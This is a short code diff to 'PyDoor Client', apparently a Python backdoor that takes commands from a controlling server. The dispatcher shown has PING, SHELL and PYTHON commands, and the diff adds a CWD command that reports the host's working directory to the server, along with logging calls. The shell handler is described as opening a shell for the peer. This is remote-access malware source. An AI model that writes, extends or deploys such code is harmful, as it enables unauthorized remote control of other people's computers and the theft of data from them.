@@ -1,4 +1,5 @@
 """ PyDoor Client """
+import os
 import json
 import logging
 import subprocess
@@ -30,6 +31,8 @@ class Client(BaseClient):
         match command:
             case 'PING':
                 self.ping()
+            case "CWD":
+                self.cwd()
             case 'SHELL':
                 self.shell()
             case 'PYTHON':
@@ -61,7 +64,13 @@ class Client(BaseClient):
 
     def ping(self) -> None:
         """ Respond to server ping """
+        logging.info("Responding to server ping")
         self.write(b'PONG')
+
+    def cwd(self) -> None:
+        """ Send cwd to server """
+        logging.info("Sending cwd to server")
+        self.write(os.getcwdb())
 
     def shell(self) -> None:
         """ Open a shell for peer """
